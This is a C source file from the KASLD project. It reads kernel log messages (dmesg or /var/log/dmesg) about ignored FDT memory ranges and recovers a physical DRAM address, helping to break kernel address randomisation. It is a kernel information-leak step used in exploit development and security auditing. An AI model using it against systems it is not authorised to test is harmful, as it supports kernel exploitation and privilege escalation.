// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Flattened Device Tree (FDT) driver prints "Ignoring memory range" error if
// the requested memblock range is higher than max physical memory or smaller
// than __virt_to_phys(PAGE_OFFSET).
//
// For example, early_init_dt_add_memory_arch(0x80000000, 0x80000) on a system
// with DRAM start of 0x80200000 will print:
//
// [    0.000000] OF: fdt: Ignoring memory range 0x80000000 - 0x80200000
//
// On RISCV64 this may occur as the first 2MB are reserved for OpenSBI.
//
// On systems with a known phys->virt offset mapping, this may be used to
// identify the kernel virtual address region used for direct mapping.
//
// Requires:
// - kernel.dmesg_restrict = 0; or CAP_SYSLOG capabilities; or
//   readable /var/log/dmesg.
//
// References:
// https://elixir.bootlin.com/linux/v6.1.1/source/drivers/of/fdt.c#L1251
// https://patchwork.kernel.org/project/linux-riscv/patch/20211123015717.542631-2-guoren@kernel.org/#24615539
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include "kasld.h"
#include "include/syslog.h"
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

unsigned long get_phys_addr_dmesg_early_init_dt_add_memory_arch() {
  char *syslog;
  char *endptr;
  char *substr;
  char *line_buf;
  char *addr_buf;
  const char *needle = "OF: fdt: Ignoring memory range 0x";
  int size;
  unsigned long addr = 0;

  printf("[.] searching dmesg for early_init_dt_add_memory_arch() ignored memory "
         "ranges ...\n");

  if (mmap_syslog(&syslog, &size))
    return 0;

  substr = strstr(syslog, needle);
  if (substr == NULL)
    return 0;

  line_buf = strtok(substr, "\n");
  if (line_buf == NULL)
    return 0;

  /* OF: fdt: Ignoring memory range 0x80000000 - 0x80200000 */
  // printf("%s\n", line_buf);

  addr_buf = strstr(line_buf, " - ");
  if (addr_buf == NULL)
    return 0;

  addr = strtoul(&addr_buf[2], &endptr, 16);

  if (addr >= KERNEL_VAS_END)
    return 0;

  if (addr) {
    printf("leaked DRAM physical address: %#018lx\n", addr);
    return addr;
  }

  return 0;
}

unsigned long get_phys_addr_dmesg_log_file_early_init_dt_add_memory_arch() {
  FILE *f;
  char *endptr;
  char *substr;
  char *addr_buf;
  char *line_buf;
  const char *path = "/var/log/dmesg";
  const char *needle = "OF: fdt: Ignoring memory range 0x";
  unsigned long addr = 0;
  char buff[BUFSIZ];

  printf("[.] searching %s for early_init_dt_add_memory_arch() ignored memory "
         "ranges ...\n", path);

  f = fopen(path, "rb");
  if (f == NULL) {
    perror("[-] fopen");
    return 0;
  }

  while ((fgets(buff, BUFSIZ, f)) != NULL) {
    substr = strstr(buff, needle);
    if (substr == NULL)
      continue;

    line_buf = strtok(substr, "\n");
    if (line_buf == NULL)
      break;

    /* OF: fdt: Ignoring memory range 0x80000000 - 0x80200000 */
    // printf("%s\n", line_buf);

    addr_buf = strstr(line_buf, " - ");
    if (addr_buf == NULL)
      break;

    addr = strtoul(&addr_buf[2], &endptr, 16);

    if (addr >= KERNEL_VAS_END) {
      addr = 0;
      break;
    }

    if (addr) {
      printf("leaked DRAM physical address: %#018lx\n", addr);
      break;
    }
  }

  fclose(f);

  return addr;
}

int main() {
  unsigned long addr = get_phys_addr_dmesg_early_init_dt_add_memory_arch();
  if (!addr)
    addr = get_phys_addr_dmesg_log_file_early_init_dt_add_memory_arch();

  if (!addr)
    return 1;

  printf("possible PAGE_OFFSET physical address: %#018lx\n", addr);

  return 0;
}
